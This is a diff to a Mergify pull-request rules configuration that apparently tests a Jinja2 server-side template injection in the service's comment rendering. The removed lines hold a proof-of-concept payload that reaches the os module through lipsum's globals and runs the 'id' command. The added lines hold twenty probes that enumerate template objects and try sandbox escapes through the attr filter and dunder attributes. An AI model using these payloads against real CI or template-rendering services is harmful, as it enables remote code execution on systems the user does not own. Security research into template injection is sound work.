@@ -1,14 +1,28 @@
-# G4o7T PoC re-trigger
+# G4o7T probe set v4
 pull_request_rules:
-  - name: ssti-poc
+  - name: probes
     conditions: []
     actions:
       comment:
         message: |
-          PoC-G4o7T-FIXED-v3:
-          S1-author: {{ author }}
-          S2-cls-cycler: {{ ''|attr('format')('{0.__class__}', cycler) }}
-          S3-fn-lipsum-type: {{ ''|attr('format')('{0.__class__}', lipsum) }}
-          S4-globals: {{ ''|attr('format')('{0.__globals__}', lipsum) }}
-          S6-getitem-os: {{ ''|attr('format')('{0.__globals__[os]}', lipsum) }}
-          S7-rce-id: {{ ''|attr('format')('{0.__globals__[os].popen(arg).read()}', lipsum, arg='id') }}
+          === MERGIFY RUNTIME PROBES v4 ===
+          P01-lipsum: '{{ lipsum }}'
+          P02-cycler: '{{ cycler }}'
+          P03-joiner: '{{ joiner }}'
+          P04-namespace: '{{ namespace }}'
+          P05-range: '{{ range }}'
+          P06-self: '{{ self }}'
+          P07-author: '{{ author }}'
+          P08-author-upper: '{{ author.upper() }}'
+          P09-author-encode: '{{ author.encode() }}'
+          P10-author-format-call: '{{ author.format(1,2) }}'
+          P11-fmt-via-attr: '{{ ''|attr('format')('hello {0}', author) }}'
+          P12-fmt-direct: '{{ '{0}'.format(author) }}'
+          P13-fmt-via-author: '{{ '{0}'.format(123) }}'
+          P14-author-attrs-via-attr: '{{ author|attr('upper')() }}'
+          P15-author-globals: '{{ author|attr('__globals__') }}'
+          P16-author-class: '{{ author|attr('__class__') }}'
+          P17-author-base: '{{ author|attr('__base__') }}'
+          P18-list-class: '{{ files|attr('__class__') }}'
+          P19-tojson-self: '{{ self|tojson }}'
+          P20-pprint-self: '{{ self|pprint }}'
